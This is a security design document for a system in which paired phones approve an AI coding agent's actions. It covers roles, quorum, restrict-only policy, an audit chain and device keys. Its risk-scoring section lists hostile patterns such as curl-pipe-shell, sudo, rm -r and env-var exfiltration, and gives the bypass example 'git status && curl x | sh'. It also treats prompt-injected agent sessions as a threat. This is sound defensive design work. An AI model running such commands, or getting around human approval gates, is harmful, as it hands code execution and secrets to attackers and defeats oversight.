# v2 / 02 — Security architecture (teams, delegation, quorum, policy, audit, device keys, auto-allow, scale)

Role: Security architect. Status: 2026-10-24. Inputs: `v2/00-brief.md`, v1 `reports/02-security.md`
(cited as v1-F# / v1-§), ROADMAP §1 (I1–I4), D3, D7, D8, D13, D24, D25, ADR 0010, 0016, 0017.
Nothing here is a decision. Code was not re-read; statements about the implementation come from the
ADR/ROADMAP text and are marked as such.

## 1. Summary

1. v1's authority model is "one agent trusts a set of paired phone keys, decided at the terminal". Every v2 team feature can be built without moving authority to the relay if the **agent stays the only policy decision point** and every widening of trust still starts at the agent's terminal or is signed by an already-trusted human device.
2. Introduce **principals** (a human label owning 1..n paired devices, stored agent-side in `peers.json`) and **roles** (`viewer`, `responder`, `approver`, `owner`) fixed at terminal pairing time. An `approver` is code execution as the machine user; the product must say so on the pairing screen.
3. **Central policy is monotone-restrictive**: an admin-signed bundle (pinned admin key, anti-rollback counter, freshness TTL) can only narrow what local config + pairing already allow (fewer roles, narrower scopes, quorum, time windows). It can never add a principal, widen an allow-list or grant. A compromised admin device or relay therefore yields lock-out at worst, recoverable at the terminal.
4. **Quorum (k-of-n)** is agent-side aggregation of independent per-signer decisions over the same `request_hash`; no threshold cryptography. Any `deny` is a veto. The requester does not count. It resolves before `hook deadline − 10 s` or denies (I2).
5. **Delegation** is a signed, time-boxed, depth-1 upgrade of an already-paired principal, sent by the owner over the existing KK session.
6. **Audit** is a hash-chained log kept on the agent (content stays local, I3), with 32-byte chain-head anchors at the relay and last-seen heads on phones, so truncation or rewrite is detectable by parties the host cannot reach. The relay gains no readable content.
7. **Auto-allow cannot exist as "the agent decides"**. It is admissible only as a **standing rule** signed by a human with a fresh device signature, structured (not shell-glob) matchers, bounded in time and uses. This needs an ADR amending I1 (§5.7). Risk scores are advisory and **may only tighten** friction.
8. Native device keys: Secure Enclave / Android Keystore P-256 keys with per-use biometry are the right per-human anchor, but they are non-exportable and invalidated by biometric re-enrolment, so v2 needs a first-class **`enroll` decision kind** (add/replace a device authorised by existing principals over KK) instead of re-pairing at the terminal for every phone change.
9. Scale: the routing rule "`to` device belongs to the socket's user" (v1-§5.7) breaks with shared machines; replace with "frame travels only along a completed pairing edge". ADR 0016 ledger tables need per-tenant caps or one tenant can starve all (`busy`).
10. Two small v1 hardening findings fall out (F-A salt/guard of hashes visible to relay, F-B revocation delivery is relay-dependent) — both worth doing before v2 work starts.

## 2. Verified facts

Only facts fetched in this session are listed with a URL; v1 facts are re-used by reference.

- V1. Android Keystore: StrongBox KeyMint supports a reduced algorithm set (ECDSA/ECDH P-256 among them) and throws `StrongBoxUnavailableException` otherwise; `setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)` requires authentication for every operation (API 30+; older: `setUserAuthenticationRequired(true)`); keys that accept only biometrics are by default invalidated when new biometric enrolments are added (`setInvalidatedByBiometricEnrollment`); attestation is requested with `setAttestationChallenge` and the chain read from `getCertificateChain`; `KeyInfo.getSecurityLevel()` reports `TRUSTED_ENVIRONMENT`/`STRONGBOX`; secure hardware generally does not enforce validity time intervals (no trusted clock) — https://developer.android.com/privacy-and-security/keystore
- V2. Re-used from v1 (verified there): hooks run with the user's full permissions and managed settings exist (v1-F11, https://code.claude.com/docs/en/hooks); deny beats allow and `Bash` content rules are treated as bypassable (v1-F12, https://code.claude.com/docs/en/permissions); WebAuthn assertion binds a challenge and carries a UV flag (v1-F8/F9); Coucou fingerprint-bound, decide-once approvals with 600 ms tap guard (v1-F15).
- V3. From the repo (ADR/ROADMAP text, not re-verified in code): decisions are canonical JSON including `request_id` and `request_hash`; the agent verifies ES256 assertions with SPKIs delivered in encrypted pairing msg3 (ADR 0010); native app signs `SHA-256(canonical decision)` with a Secure Enclave P-256 key, access control "biometry, current set" (ADR 0017); WebAuthn challenges and verified-decision hashes live in two PG tables capped at 10,000 rows each with `busy` when full, rate limits are per replica (ADR 0016); one KK session per (phone, agent), first accepted decision wins, device cap 10 per user (D25); relay session cookie, passkey-only accounts, invite codes (D8).

## 3. Assumptions (unverified — web pages did not render or no primary source)

- A1. Secure Enclave supports only NIST P-256 keys, they are non-exportable, and `.biometryCurrentSet` invalidates the key when enrolled biometrics change. Widely documented; the Apple documentation page fetched here (https://developer.apple.com/documentation/cryptokit/secureenclave) returned only its title, so treated as unverified. Consequence: the Noise static key (X25519) cannot live in the Secure Enclave and is a software key in the Keychain (ADR 0017: noble backend).
- A2. App Attest (`DCAppAttestService`) yields a per-install key, a one-time attestation chain to an Apple root, and assertions with a strictly increasing counter. (https://developer.apple.com/documentation/devicecheck/establishing-your-app-s-integrity returned only its title.) Verifying it on the agent needs X.509/CBOR parsing, which conflicts with D13's "zero runtime dependencies in the published bundle". Hence attestation is deferred (§5.9).
- A3. The Noise static key must be readable by the Notification Service Extension while the phone is locked after first unlock, so its Keychain class is "after first unlock, this device only". A jailbroken or forensically imaged phone can therefore read it; that leaks confidentiality of that phone's sessions, not authority (the device signing key still needs biometry).
- A4. Claude Code's `PermissionRequest` timeout path in interactive sessions still falls back to the terminal prompt (v1-A7). Quorum design assumes this; if false, quorum must be limited to requests that can wait.
- A5. Teams of interest are small (2–20 humans, 1–50 machines per org), self-selected, and trust the machine owner. Enterprise MDM/SSO is not a v2 goal.
- A6. `request_id` (122-bit random, agent-generated) is never present in a relay-visible field. If it is, F-A below gets worse. Needs a grep-level test (W-S12).

## 4. Findings

### 4.1 What changes in the threat model

v1 assets: execution on the machine, request content, identity, approval-path availability. v2 adds:

| New asset / actor | Why it matters | Control (section) |
|---|---|---|
| Insider approver (a human with `approver` on a shared machine) | An Allow is code execution as the machine user; the machine owner delegates that power to a colleague | Roles fixed at terminal, scope per project, quorum, audit (§5.1–5.4) |
| Every extra paired device = another reader of plaintext (commands, diffs, secrets, transcripts) | v1 fan-out sends each request to all phones (D25) | Agent-side per-peer project scope; `viewer` is a real privilege (§5.1) |
| Admin / org signing key | Becomes a high-value target the day central policy exists | Monotone policy: compromise cannot widen (§5.2) |
| Departed employee's device | Revocation travels through the relay, which can withhold it | Leases / policy freshness (§5.2, F-B) |
| Audit log | Evidence is only worth something if the host (and prompt-injected session) cannot silently rewrite it | Chain + external anchors (§5.4) |
| Standing rules | A signed rule is a pre-authorised decision that outlives the human's attention | Structured matchers, caps, UV on creation (§5.7) |
| Relay tenancy | One relay serves many orgs; cross-tenant routing bugs now matter more | Edge-based routing, per-tenant caps (§5.8) |
| Native device keys | Hardware-bound, non-recoverable, biometry-invalidated | `enroll` kind, lifecycle states (§5.6) |

Unchanged and still the honest ceiling: a prompt-injected Claude session or any local admin on the machine runs with the user's permissions and can read agent keys, edit config, kill the agent (v1-§4.1). Quorum, policy and audit **do not protect against the machine's own user**; they protect against *remote* principals and against a malicious/compromised relay or admin phone. `SECURITY.md` must state this in v2 terms ("four eyes is for remote approvers, not for the local account").

### 4.2 Invariants under each theme

| Theme | I1 (no execution because relay said so) | I2 (never hang CC) | I3 (relay metadata only) | I4 (agent installable, no self-update) |
|---|---|---|---|---|
| Teams / principals | holds if principals are added only at terminal or via `enroll` signed by existing approvers | n/a | relay org membership is a hint, not authority | holds |
| Delegation | holds: delegation is a human-signed message over KK | expiry enforced by agent clock | holds | holds |
| Quorum | holds: each signature over exact request; aggregation on agent | **at risk** if waiting for k blocks the hook; mitigated by deadline rule | holds | holds |
| Central policy | holds only if monotone (restrict-only) | stale policy must not hang; falls back to owner-only | bundle is opaque blob to relay | policy is data, not code: no auto-update of code |
| Audit | holds | log write must be non-blocking | relay stores only 32-byte anchors | holds |
| Auto-allow / risk | **breaks as stated** unless I1 is amended (§5.7) | holds | holds | holds |
| Scale | routing must be edge-based | n/a | caps, no content | holds |

Only one invariant needs an ADR to change (I1, for standing rules). Everything else fits as-is.

### 4.3 Teams: authority model

- Authority today = the agent's `peers.json` (static keys + passkey SPKIs, ADR 0010). The relay's `user_id` is an account concept used for routing and quotas (D8), not an authority source (v1-§4.1.1).
- Multi-human changes two relay assumptions: (a) pairing edges now connect devices of different relay accounts; (b) the routing check "`to` belongs to the socket's `user_id`" no longer expresses the rule.
- Role lattice (agent-local, ceiling set at pairing): `owner` ⊃ `approver` ⊃ `responder` ⊃ `viewer`.
  - `viewer`: receives requests/transcripts of in-scope projects; no decision kinds. Still a confidentiality grant.
  - `responder`: `deny`, `stop`, and `answer` only if policy allows (answers steer the session; v1 Q3 treated them like Allow — keep).
  - `approver`: `allow`, `always` (session scope), `answer`, `instruct`.
  - `owner`: everything plus `enroll`, `delegate`, policy reset, rules.
- Pairing invite carries the role: `remotectl invite --role approver --scope <project> --ttl 10m` prints the existing XXpsk0 QR/code (D3) with the chosen role bound into the pairing prologue and the agent-side confirmation prompt (`Pair "Maria" as approver for repo-x? [y/N]`). No new protocol mechanism: role is local state set by the person at the keyboard.

### 4.4 Delegation

Use case: owner on holiday, colleague covers. The cheapest sound model: the delegate is already paired as `responder` or `viewer`; the owner signs `{kind:"delegate", delegate_device_id, role:"approver", scope, not_after ≤ 24 h, max_uses?}` with the Secure Enclave key (UV), sends it over the owner's KK session; the agent verifies exactly like any non-deny decision, stores it, enforces expiry by its own clock, and the delegate cannot re-delegate. Revocation = owner `deny`-class message (no UV, shrinks trust) or expiry. Because the agent clock decides, the V1 note that secure hardware lacks a trusted clock does not matter.

### 4.5 Quorum

Per-signer decision: the existing canonical decision JSON gains `signer_principal` implicitly via `phone_device_id`; each approver signs their own decision hash (so the existing per-device binding, ADR 0010/0017 checks, and decide-once per signer remain). Agent logic: collect distinct-principal valid `allow`s for the same `request_hash`; resolve when `k` reached; any valid `deny` from a principal with deny right resolves deny immediately; expiry resolves deny. Properties needed:

- Distinctness is by **principal**, not device (one human with two phones counts once). Principals are assigned at the terminal, so a user splitting themselves into two principals is a deliberate act by whoever holds the keyboard, which is the owner.
- The initiator of a session (the principal that issued `start`/`instruct`) does not count towards that session's quorum.
- Quorum applies per tool class via policy (e.g. `Bash` outside project root, writes to `.git`/`.claude`, `instruct`, `enroll`). Not per session.
- The request is shown identically to all approvers; the canonical `request_hash` is the common binding, so approvers cannot be shown different commands under one request (relay cannot split-brain because content is E2E from the agent).
- Time: quorum window = `min(300 s, hook deadline − 10 s)`; if the hook default (600 s, v1-F11) is the ceiling, 300 s is the effective bound. Notification fatigue for the second approver is a UX problem; do not stretch the window.

Threshold signatures (FROST, multisig) were considered: they would give one aggregate signature the agent verifies, but add heavy crypto, no vetted small library fits D13's dependency budget, and Secure Enclave keys cannot take part (P-256 hardware signs only standard ECDSA). Rejected.

### 4.6 Central policy

Needs: org-wide deny lists, role ceilings, quorum rules, time windows, required hardware-backed keys, retention. Constraints: relay must not hold authority (I1), "never a phone-editable allow-list" (ROADMAP §1 "Never"), D13 forbids auto-update of code.

Design: a **policy bundle** is canonical JSON `{v, org_id, version (monotonic), issued_at, valid_until, rules[], revoked_principals[], signature}` signed with an admin P-256 device key (Secure Enclave, UV). The bundle travels as an opaque ciphertext blob through the relay (relay stores the latest blob per org, as it already stores push subscriptions, but never parses it) or directly over a KK session from an admin phone (preferred; no relay storage). The agent:

1. Pins admin public key(s) at `remotectl org enroll` (fingerprint confirmed at the terminal, like pairing step 3). This is the only trust bootstrap.
2. Verifies signature, `version > stored`, `now < valid_until` (default freshness TTL 14 days).
3. Computes `effective = local_config ∩ pairing_ceiling ∩ policy` — policy can only subtract. A rule that would widen is ignored and logged `policy_widen_ignored`.
4. On expiry or invalid bundle falls back to **owner-only mode** (only devices with role `owner`), not a total outage, and logs it. This is the I2-consistent failure: deny to non-owners, never hang.
5. `remotectl policy reset` (terminal only) removes the org binding. A compromised admin key can therefore at most lock others out until someone at the keyboard resets.

Rejected: relay-evaluated policy (relay would decide, violating I1/I3 since policy conditions need plaintext); policy that can add approvers (turns the admin key into a remote root on every enrolled machine — the exact class of RCE v1 §4.1 refuses); Claude Code managed settings as the policy channel (v1-F11: managed hooks exist, but distribution is MDM-specific and outside our control; usable as an optional additional layer, not as the design).

Fleet cost to be honest about: with restrict-only policy, onboarding a new human on N machines needs a terminal step on each (or an `enroll` approved by existing approvers, §5.6). Owner question Q-S2.

### 4.7 Audit trail without breaking I3

What an audit consumer needs: who (principal/device), what (request summary + hash), decision, when, under which policy version, with a signature. What must not leave the user's machines: the content. So:

- **Where**: on the agent, append-only file `audit.log`, JSON lines; entry `{seq, ts, kind, principal, device, request_hash, tool, summary?, decision, policy_version, signature_ref, prev_hash, entry_hash}`. `entry_hash = SHA-256(prev_hash || canonical body-hash fields)`. The body (summary/text) is stored in a sidecar and referenced by hash, so redaction for GDPR erasure leaves the chain intact (hash of removed body stays).
- **The decision signature itself** (assertion or Secure Enclave ES256) is stored with the entry: the log can be independently verified against pinned SPKIs without trusting the agent's word — a stronger statement than "the agent says Maria approved".
- **Anchors**: every N entries or 10 minutes the agent sends the relay `{agent_device_id, seq, head_hash, ts}` (32 bytes + counters; metadata, I3-clean) and sends the same head to each connected phone over KK. Phones keep the last seen head. A host that rewrites history cannot also rewrite the relay's anchors and the phones' memories; a verifier compares. Truncation detectable if `seq` goes backwards.
- **Export**: an `owner`/`auditor` device requests the log over KK; the agent streams it E2E; the verifier checks chain + signatures + anchors locally. Relay stores no log.
- **Limits**: a compromised host can stop logging (silence) or forge future entries; anchors show *gaps* only if the verifier expects regular heartbeats, so anchors include a heartbeat and the relay reports "no anchor since T" as metadata. Against a root-level local attacker audit is evidence of the past, not prevention (same ceiling as §4.1).
- **Relay audit_log (v1-§5.6)** stays as is: event/user/device/ts, 90 days. Do not enrich it with request hashes.

Rejected: sending audit entries (even hashed) to the relay for storage (adds retention/legal exposure and dictionary-attackable hashes for short commands, see F-A); storing the log only at the relay (violates I3); blockchain/transparency log (disproportionate).

### 4.8 Key management with native device keys

Key inventory per native device (v2): (1) Noise static X25519 key — software, Keychain, readable by NSE (A3); (2) decision signing key — Secure Enclave/Keystore P-256, per-use biometry (ADR 0017; V1); (3) relay account passkey (platform authenticator) — D8; (4) APNs token, notification key (ADR 0017). Facts that drive the design:

- Decision key is non-exportable and bound to the biometric set (A1/V1): face re-enrolment, a new fingerprint, restoring to a new phone, or an OS reset **kills it**. In v1's single-owner world the cost was "re-pair, 30 s". In a team on a remote machine, re-pair needs terminal access.
- Android: StrongBox availability varies; fall back to TEE and record which in the pairing hello (`key_level: strongbox|tee|se`) for the agent to display and policy to require. `FEATURE_STRONGBOX_KEYSTORE` check, `getSecurityLevel()` (V1).
- Two keys per phone (Noise static, decision) must be rotated together or the pairing is inconsistent. State machine per peer in `peers.json`: `pending → active → suspended → revoked`, plus `replaced_by`.
- **`enroll` decision kind** (new, ADR-gated): `{kind:"enroll", principal, new_device_id, noise_static_pub, decision_key_spki, key_level, nonce}` signed by the *existing* key of the same principal (if still valid) or, if that key is dead, approved by k existing approvers/owner (quorum rules apply). Delivered over KK to the agent; the new phone proves possession by signing the agent-supplied nonce with the new key during a pairing XXpsk0 run whose PSK is delivered by an approver (out-of-band code relayed by the approver, not through the relay in plaintext). This preserves I1 (decision on a paired phone bound to the exact request) and ADR 0010's "new key reaches the computer over KK, never via the relay".
- Offboarding: `revoke` is a shrink and may arrive via the relay, but the relay can drop it (F-B). Add peer **leases**: `valid_until` per peer (default 30 days for team peers, none for the single-owner case), renewed silently by any successful signed decision or by an explicit `renew` from `owner`. A peer past its lease is `suspended`. Cost: a forgotten phone stops working — correct failure.
- Cloud backup / device migration: keys must be created `ThisDeviceOnly` (no iCloud Keychain sync) so the Noise key is not cloned to a second Apple ID device (assumption A1/A3; verify in W-S9).
- Attestation (App Attest / Key Attestation): useful to prove "this key is in real hardware, in the genuine app" for policy `require_hw_key`. Rejected for v2.0 because verifying chains needs X.509/CBOR parsing (D13 dependency budget) and Apple's risk metric needs a server-side relationship; revisit in v2.x. v2.0 uses self-declared `key_level` displayed to the human at pairing. Honest consequence: `require_hw_key` is advisory in 2.0.

### 4.9 Risk scoring and auto-allow

Two different things were bundled in the brief; they have different security properties.

**Risk scoring (advisory).** Compute on the agent (it holds plaintext) with deterministic rules: path outside project root or inside `.git`/`.claude`/agent config dir; presence of `sudo`, `curl|sh`, `rm -r`, package install, network egress verbs, env-var exfil patterns, writes over N files; MCP tools not in an allow-list. Send `{score, reasons[]}` inside the encrypted request. UI uses it for friction only:
- high score disables swipe-approve, widget/Control Center approve and notification-button approve (force opening the card);
- medium/high may trigger policy quorum;
- score **never lowers** a requirement and never decides. "Scores only tighten."
No LLM scorer: (a) it would be prompt-injectable by the content it scores, (b) it would ship command text to a third party, violating the product's reason to exist (ROADMAP §1 (c)). Rejected.

**Auto-allow / learned rules.** "The agent allows what history says is fine" is the agent granting on its own — forbidden by I1 as written and by v1's self-approval rule. Safe alternative is a **standing rule**:
`{rule_id, tool, matcher, scope_cwd, not_before, not_after, max_uses, issuer_principal, created_at}` signed (ES256 / assertion, UV) by an `approver`, bound to its own canonical hash, stored by the agent, listed in the audit log on creation and on every use. Matcher restrictions that make it sound:
- **No shell-string globs.** Claude Code itself treats `Bash` content rules as bypassable (v1-F12); `git status && curl x | sh` defeats a prefix matcher. For `Bash` the only matcher is **exact normalised command hash + cwd** ("repeat this exact command").
- Structured tools (`Read`, `Glob`, `Grep`, `Edit` within a path set) may use field matchers evaluated on the parsed `tool_input`, scoped to realpath'd allow-listed roots (D13 `realpath` rules).
- Never auto-allowable: writes to `.git`/`.claude`/agent config, `instruct`, `start`, `enroll`, `delegate`, anything with risk ≥ high, anything that quorum policy covers.
- Bounds: lifetime ≤ 7 days (default 24 h), `max_uses` default 50, killed by owner `deny`-class `rule_revoke` (no UV), killed by project realpath change.
- "Learned from history" produces **suggestions only** ("you approved this exact command 6 times in 3 days — make it a 24 h rule?"); creation requires the same UV signature as an Allow. This is D24's "Always" generalised and already the precedent: "Always" is a human decision whose object is a rule, not a request.

I1 amendment text (ADR-shaped, §5.7): "Nothing runs on the user's machine because the relay said so. Every machine-touching action is authorised by a paired, authenticated device either bound to the exact request (§D7) or to a standing rule that the same kind of device signed with user verification, that the agent matches deterministically on structured fields, and that is bounded in time and uses." The relay is still excluded; the agent still never grants without a human signature in the causal chain.

**Batch approvals**: one signature over `SHA-256(sorted list of request hashes)`; every item listed on screen; excluded for risk ≥ high and for quorum-covered classes. Equivalent to N Allows; reuses decide-once per request.

### 4.10 Abuse at scale and tenancy

- **Routing**: v1 rule (v1-§5.7) "to must belong to the socket's user" must become "(`from`,`to`) is a row in `pairings`, created only by a completed XXpsk0 pairing". Threat: IDOR on `to` with multi-account orgs. Property test: for random frames, delivery happens iff an edge exists; zero cross-edge deliveries.
- **Org objects at the relay** (org, membership, role hints, billing) are *metadata/hints*; the agent never reads a relay-asserted role. A malicious relay claiming "Bob is owner" changes the UI label only. Test: agent ignores a forged `role` field (zod `.strict()` already closes unknown keys; role is not part of any accepted frame).
- **Notification amplification**: with N approvers, one request produces N pushes. Caps: 1 push per agent per principal per 30 s (v1 had per agent); a push storm from a compromised agent token is bounded by the agent→principal edge set, so it can only annoy its own paired humans. Attackers cannot push to arbitrary phones because pairing needs the terminal PSK (ADR 0017: relay pushes only over authenticated sessions).
- **Account farming**: invite codes (D8) remain the gate. Org-scoped invite codes with per-org quota; no email means no verification cost for attackers, so keep manual issuance until paying customers exist.
- **ADR 0016 ledger at >2 replicas**: tables capped at 10,000 rows each, `busy` when full. One tenant creating many step-ups can fill the cap and make every tenant see `busy` (noisy-neighbour DoS). Fix: per-user and per-org row quotas (e.g. 200 outstanding each) enforced in the same statement; global cap stays as a backstop. Overshoot "by a few rows" under concurrency (ADR 0016) is fine for a global cap but not for per-tenant fairness — use `INSERT … SELECT … WHERE (SELECT count(*) …) < quota` accepting small overshoot, or an advisory lock per tenant.
- **Rate limits per replica** (ADR 0016): effective limit = N × configured. With registration limits at 5/h per IP and N = 5 replicas that is 25/h, still negligible; but across regions a **global** invite/registration limiter in PG is cheap (rare path). Keep per-request limiters local.
- **Regions** introduce a new trust question: multi-region relays that share Postgres add cross-region latency to the verification ledger; keep decision step-up regional-sticky or prefer agent-side verification (ADR 0010/0017 already make the agent the authority), which lets relays drop the ledger for native decisions entirely at scale. Recommendation: native decisions skip relay challenge state (already true per ADR 0017); only PWA/WebAuthn decisions use the ledger.
- **Websocket/connection cost**: per-org connection caps (agents ≤ 50, devices ≤ 200 per org initially); idle sockets cost memory only (v1-§5.7).
- **Cost abuse**: APNs/Web Push calls are free to the relay but each push touches Postgres for token lookup; cap pushes per org per minute.

### 4.11 Two v1 findings surfaced by this analysis

- **F-A (low/medium): hash visibility.** The relay sees the decision hash that it turns into a WebAuthn challenge (D7, ADR 0016). If that hash covered only low-entropy content, a relay could confirm guesses ("was `git push` approved?"). The canonical decision includes `request_id` and timestamps; `request_id` is random and E2E-only (A6), so the hash is effectively salted. This must stay a tested property (W-S12): no relay-visible field may contain `request_id` or `request_hash`. If ever violated, add an agent-chosen 128-bit salt inside `request_hash`.
- **F-B (medium): revocation is only as reliable as the relay.** `peer_revoked` is delivered by the relay (v1-§5.3). A malicious relay can withhold it, leaving a stolen/ex-employee phone trusted on the agent indefinitely. v1 accepted it (single owner, device is yours). For teams this is the offboarding path. Controls: leases (§4.8), plus a local `remotectl peers revoke` always available, plus phones showing "last heard from agent".

## 5. Recommendations

### 5.1 Principals and roles (smallest design)
Agent-local principal table: `{principal_id, display, role_ceiling, scopes[], devices[], lease_until?}`. Set only at `remotectl invite` / pairing or by `enroll`/`delegate` signed by `owner`. Relay knows none of it. Agent filters outbound requests per peer by scope. Rejected: relay-managed roles (authority at relay), SAML/SCIM (no email/identity infrastructure by design, D8), per-request ACL lists on the phone.

### 5.2 Central policy as signed monotone bundle
As §4.6. Distribution preferably phone→agent over KK; relay blob store is optional convenience (opaque, size-capped 16 KiB, one per org). Rejected alternatives: see §4.6.

### 5.3 Quorum as agent-side aggregation
As §4.5. New decision kinds: none for allow (reuse); `enroll`, `delegate`, `rule_create`, `rule_revoke`, `policy_apply` added to the canonical kinds enum with the same D7 checks (all but `deny`/`rule_revoke` need UV signature).

### 5.4 Audit chain with anchors
As §4.7. Smallest cut: chain + local verify command (`remotectl audit verify`) first; anchors to relay and phones second; E2E export third.

### 5.5 Delegation = time-boxed depth-1 role upgrade
As §4.4. Rejected: capability tokens usable by anyone holding them (bearer = relay-visible risk); delegation through the relay.

### 5.6 Key lifecycle with `enroll`
As §4.8: states, leases, `key_level`, `ThisDeviceOnly`, no attestation in 2.0.

### 5.7 Standing rules and the I1 amendment
As §4.9. Write ADR "standing rules amend I1" before any rule code. Without the amendment, ship only scoring-as-friction and "Always" at session scope (D24) — the v1 position. That is a valid v2.0 cut; standing rules can ship in v2.x.

### 5.8 Tenancy and scale controls
Edge-based routing; per-tenant ledger quotas; global registration limiter; push and connection caps; decision step-up skipped for native decisions. Rejected: sticky sessions (ADR 0012/0016), Redis for limits (D15), moving policy evaluation to the relay.

### 5.9 Deferred / rejected for 2.0
Hardware attestation verification; threshold signatures; LLM risk scoring; relay-side audit content; SSO/SCIM; admin-signed widening of principals (fleet convenience, see Q-S2).

### 5.10 Release shaping (security view)
- **v2.0 minimum sound team slice**: principals + roles + project scoping, `viewer`/`responder`/`approver`, leases, quorum for a policy-defined class, hash-chained local audit, restrict-only policy, per-tenant caps, routing by edge, F-A test.
- **v2.1**: delegation, `enroll`, audit anchors/export, standing rules (after ADR), batch approvals.
- Do not market "enterprise" until an external review of the aggregated trust code (quorum + policy + enroll, est. 600–900 lines) — v1 R2 already asks for audit of the Noise code.

## 6. Risks

| # | Risk | L | I | Mitigation |
|---|---|---|---|---|
| S1 | Approver role under-explained; users grant `approver` to colleagues unaware it is shell access | High | High | Pairing prompt text, README, `SECURITY.md`, default role for `invite` is `viewer` |
| S2 | Policy bundle bug lets a rule widen privileges | Low | Critical | Compute `effective` by intersection only; property test: for any bundle, effective ⊆ local ∩ ceiling |
| S3 | Admin key compromise | Low | High (lock-out) | Restrict-only; terminal `policy reset`; admin key in Secure Enclave with UV |
| S4 | Quorum starves requests, users fall back to terminal and disable the remote path | Medium | Medium | Quorum only for policy-listed classes; deadline rule; metrics on timeouts |
| S5 | Audit log silently disabled by prompt-injected session or local admin | Medium | Medium | Heartbeat anchors; "no anchor since T" visible in phone UI; documented ceiling |
| S6 | Biometric re-enrolment kills decision key during an incident | Medium | Medium | `enroll` with quorum/owner; at least two owners per team; documented recovery |
| S7 | Standing rule matcher bypass (shell tricks) | Medium | High | Exact command hash for `Bash`; structured matchers only; no globs |
| S8 | Risk score gamed to reduce friction | Medium | Medium | Scores only tighten; score is not a gate for allow |
| S9 | Relay routing bug exposes a cross-org frame | Low | High | Edge table routing; AAD still prevents re-addressing; content E2E; property test |
| S10 | Ledger starvation (noisy neighbour) | Medium | Medium | Per-tenant quotas (§4.10) |
| S11 | Stale revocation (F-B) keeps ex-member trusted | Medium | High (teams) | Leases, local revoke, last-heard indicator |
| S12 | GDPR: audit sidecars hold personal data (names, commands) | Medium | Medium | Content stays on customer machine; body/hash split enables erasure; privacy page update |

## 7. Work items

Sizes: S ≤ ½ day, M ≤ 2 days, L ≤ 1 week (one developer + AI executor). All ACs are machine-checkable. IDs `W-S#`.

1. **W-S1 (S)** ADR set: "principals and monotone policy", "quorum aggregation", "audit chain and anchors", "standing rules amend I1", "enroll kind". Deps: none. AC: five files `docs/adr/00NN-*.md` exist with Status/Deviates-from headers; `pnpm check` docs gate passes.
2. **W-S2 (M)** Principal table + roles + scopes in `peers.json` (migrate legacy peers to `owner`/their existing role), `remotectl invite --role --scope --ttl`, per-peer outbound scope filter. Deps: W-S1. AC: test: a `viewer` receives no `allow` capability (decision refused with reason `role`); request for a project outside scope is never sent to that peer; legacy `peers.json` loads and maps to `owner`.
3. **W-S3 (M)** Monotone policy engine + bundle verification (signature, pinned admin key, anti-rollback, freshness TTL, owner-only fallback, `policy reset`). Deps: W-S2. AC: fast-check property: for random local config, ceiling and bundle, `effective ⊆ local ∩ ceiling`; stale bundle → non-owner decisions refused, owner works; version rollback rejected; widening rule logged `policy_widen_ignored`.
4. **W-S4 (M)** Quorum aggregator in the hub: distinct-principal counting, initiator exclusion, veto, deadline rule. Deps: W-S2, W-S3. AC: tests: k−1 approvals then timeout → deny before `deadline−10 s`; two phones of one principal count once; one `deny` resolves deny; decision for request A never counts for B; replay of an approval is a no-op.
5. **W-S5 (M)** Hash-chained local audit log + `remotectl audit verify`, body/hash split, redaction command. Deps: W-S2. AC: flipping one byte or removing one entry makes `audit verify` fail with the first bad `seq`; redaction of a body keeps `verify` green; log write failure does not block a decision (I2 test).
6. **W-S6 (M)** Audit anchors: agent→relay head (`audit_anchor` frame, strict schema, 32-byte hash + seq), relay stores latest per agent, phones store last head over KK, heartbeat gap metadata. Deps: W-S5. AC: relay schema introspection shows no column beyond `agent_device_id, seq, head_hash, ts` (extends the I3 schema check); a rewritten log fails verification against the anchor; canary test shows no body in relay logs.
7. **W-S7 (M)** Delegation: `delegate` kind, depth-1, expiry on agent clock. Deps: W-S2. AC: delegate's `allow` accepted within window and refused after `not_after`; delegate cannot issue `delegate`; owner revoke without UV works.
8. **W-S8 (L)** `enroll` kind: new device approved by own old key or by quorum/owner; peer state machine (`pending/active/suspended/revoked/replaced_by`); peer leases. Deps: W-S2, W-S4. AC: a fake relay replaying an old `enroll` fails (decide-once + nonce); lease-expired peer's `allow` refused; revoked peer deleted even when `peer_revoked` is dropped by a fake relay (lease path).
9. **W-S9 (S)** Native key hygiene: `ThisDeviceOnly`, `key_level` in pairing hello (strongbox/tee/se), display in agent confirm prompt; unit test that keys are created with no-sync attributes (mobile lint test). Deps: ADR 0017 code (M4). AC: pairing hello zod schema contains `key_level`; agent prints it; test fixture with `key_level: "software"` is refused when policy `require_hw_key` is set (advisory flag documented).
10. **W-S10 (M)** Risk scoring v1 (deterministic rule set), friction-only UI contract in `packages/protocol` (`risk: {score, reasons}` optional field inside the encrypted request), phone/Live Activity/widget approve disabled at high. Deps: W-S2. AC: golden-file table of 40 inputs → scores; test that no code path lowers a quorum/UV requirement based on score; widget approve action absent for `score ≥ high` in the contract tests.
11. **W-S11 (L, v2.1, after ADR)** Standing rules: `rule_create`/`rule_revoke`, matcher (exact command hash; structured field matchers), caps, audit on use. Deps: W-S1, W-S5, W-S2. AC: `Bash` rule never matches `cmd && other` or any string with different hash; rule expires by agent clock; use beyond `max_uses` falls back to normal prompt; creation without UV refused.
12. **W-S12 (S)** Relay-visible-field test: no envelope/log/DB column can carry `request_id` or `request_hash`; extend zod `.strict()` and the canary test. Deps: none. AC: test greps relay DB dump and logs for a canary `request_id` after a full approval round trip.
13. **W-S13 (M)** Tenancy and scale: edge-based routing property test, per-tenant ledger quotas in ADR 0016 tables, global registration limiter in PG, push per principal cap, org connection caps. Deps: none. AC: property test: no delivery without a `pairings` row; one tenant inserting 10,000 challenges cannot make another tenant's step-up return `busy`; 429 on org push cap.
14. **W-S14 (S)** Revocation hardening (F-B): "last heard from agent" on phone; `remotectl peers revoke`; doc. Deps: none. AC: with `peer_revoked` dropped by a fake relay, the local command removes the peer and subsequent frames are refused.
15. **W-S15 (S)** `SECURITY.md` v2 section: approver = shell, viewer = plaintext reader, four-eyes ceiling, audit ceiling. Deps: W-S1. AC: file contains the five statements verbatim (grep test).

Suggested order: W-S12, W-S14, W-S13 (cheap v1 hardening) → W-S1 → W-S2 → W-S3/W-S4/W-S5 → W-S10 → W-S6/W-S7/W-S8/W-S9 → W-S11.

## 8. Open questions for the owner (with defaults)

- Q-S1. Is v2.0 a "small trusted team" product (2–20 humans, terminal-rooted trust) rather than enterprise? Default: yes.
- Q-S2. Accept that onboarding a human on N machines needs a terminal step (or `enroll` by an existing approver) per machine, i.e. no admin-signed widening? Default: yes (keeps I1/I4 intact). If no: needs an ADR for "admin-signed principal grants" and a bigger audit story.
